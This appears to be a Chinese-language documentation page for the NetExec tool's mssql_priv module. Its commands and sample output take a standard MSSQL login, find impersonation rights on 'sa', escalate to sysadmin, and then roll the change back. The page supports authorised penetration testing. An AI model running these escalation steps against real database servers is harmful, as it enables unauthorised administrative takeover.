---
description: 从标准用户提权到 DBA 的模块
---

# MSSQL 提权

## 普通认证

```
NetExec mssql <ip> -u user -p password                       
MSSQL       <ip>   1433   FQDN      [*] Windows 10 / Server 2019 Build 17763 (name:FQDN) (domain:FQDN.local)
MSSQL       <ip>   1433   FQDN      [+] FQDN\user:password
```

## 使用 **mssql_priv** 模块后的预期结果
```
NetExec mssql <ip> -u user -p password -M mssql_priv
MSSQL       <ip>   1433   FQDN      [*] Windows 10 / Server 2019 Build 17763 (name:FQDN) (domain:FQDN.local)
MSSQL       <ip>   1433   FQDN      [+] FQDN\user:password 
MSSQL_PRIV  <ip>   1433   FQDN      [+] FQDN\user 可以模拟: sa (sysadmin)
```

## 模拟
```
NetExec mssql <ip> -u user -p password -M mssql_priv -o ACTION=privesc
MSSQL       <ip>   1433   FQDN      [*] Windows 10 / Server 2019 Build 17763 (name:FQDN) (domain:FQDN.local)
MSSQL       <ip>   1433   FQDN      [+] FQDN\user:password 
MSSQL_PRIV  <ip>   1433   FQDN      [+] FQDN\user can impersonate: sa (sysadmin)
MSSQL_PRIV  <ip>   1433   FQDN      [+] FQDN\user is now a sysadmin! (Pwn3d!)
```

## 不要忘记在生产环境中回滚 sysadmin 权限
```
NetExec mssql <ip> -u user -p password -M mssql_priv -o ACTION=rollback
MSSQL       <ip>   1433   FQDN      [*] Windows 10 / Server 2019 Build 17763 (name:FQDN) (domain:FQDN.local)
MSSQL       <ip>   1433   FQDN      [+] FQDN\user:password (Pwn3d!)
MSSQL_PRIV  <ip>   1433   FQDN      [+] sysadmin role removed
```
